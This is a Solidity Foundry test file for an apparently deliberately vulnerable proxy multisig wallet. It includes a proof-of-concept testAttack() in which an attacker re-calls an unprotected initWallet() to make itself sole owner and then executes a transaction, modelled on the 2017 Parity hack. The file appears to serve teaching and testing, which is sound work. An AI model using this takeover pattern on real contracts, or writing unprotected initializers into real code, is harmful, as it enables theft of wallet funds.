// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/Wallet.sol";
import "../src/WalletLibrary.sol";

/**
 * The multisig wallet is a proxy contract, which calls the
 * WalletLibrary contract where the functionality is implemented
 * This allows for cheaper wallet deployments, since users only have to deploy
 * the lightweight proxy contract
 *
 * During deployment, function "initWallet" from the library contract will be executed
 * which defines the owners of the multisig and the number of required confirmations
 * The problem is that theres no modifier preventing another call to initWallet()
 * An attacker can just call the function again, set itself to owner and change the
 * required confirmations to 1
 *
 * This exploit is inspired from the first parity multisig hack,
 * see: https://hackingdistributed.com/2017/07/22/deep-dive-parity-bug/
 */
contract WalletLibraryTest is Test {
    WalletLibrary internal walletLibrary;
    Wallet internal wallet;

    function setUp() public {
        // wallet owners
        address[] memory _owners = new address[](3);
        _owners[0] = vm.addr(1);
        _owners[1] = vm.addr(2);
        _owners[2] = vm.addr(3);

        // deploy contracts
        walletLibrary = new WalletLibrary();
        wallet = new Wallet(address(walletLibrary), _owners, 2);
    }

    function testFunctionality() public {
        (bool s, bytes memory ret) = address(wallet).call(abi.encodeWithSignature("getOwners()"));
        assertTrue(s);
        emit log_bytes(ret);

        address alice = vm.addr(1);
        address bob = vm.addr(2);
        address cody = vm.addr(3);

        // submit tx
        vm.prank(alice);
        (bool d,) =
            address(wallet).call(abi.encodeWithSignature("submitTransaction(address,uint256,bytes)", address(0), 0, "test"));
        require(d, "fail");

        // confirm tx
        vm.prank(bob);
        (bool f,) = address(wallet).call(abi.encodeWithSignature("confirmTransaction(uint256)", 0));
        require(f, "fail");

        vm.prank(cody);
        (bool g,) = address(wallet).call(abi.encodeWithSignature("confirmTransaction(uint256)", 0));
        require(g, "fail");

        // execute tx
        vm.prank(alice);
        (bool h,) = address(wallet).call(abi.encodeWithSignature("executeTransaction(uint256)", 0));
        require(h, "fail");
    }

    function testAttack() public {
        // alice performs all subsequent calls
        address attacker = vm.addr(4);
        vm.startPrank(attacker);

        address[] memory _owners = new address[](1);
        _owners[0] = vm.addr(4);
        uint256 _numConfirmationsRequired = 1;

        // add attacker address as owner and set numConfirmations to 1
        (bool s,) = address(wallet).call(
            abi.encodeWithSignature("initWallet(address[],uint256)", _owners, _numConfirmationsRequired)
        );
        assertTrue(s);

        // submit tx
        (bool d,) = address(wallet).call(
            abi.encodeWithSignature("submitTransaction(address,uint256,bytes)", address(100000), 0, "test")
        );
        require(d, "fail");

        // confirm tx
        (bool f,) = address(wallet).call(abi.encodeWithSignature("confirmTransaction(uint256)", 0));
        require(f, "fail");

        // execute tx
        (bool h,) = address(wallet).call(abi.encodeWithSignature("executeTransaction(uint256)", 0));
        require(h, "fail");
    }
}
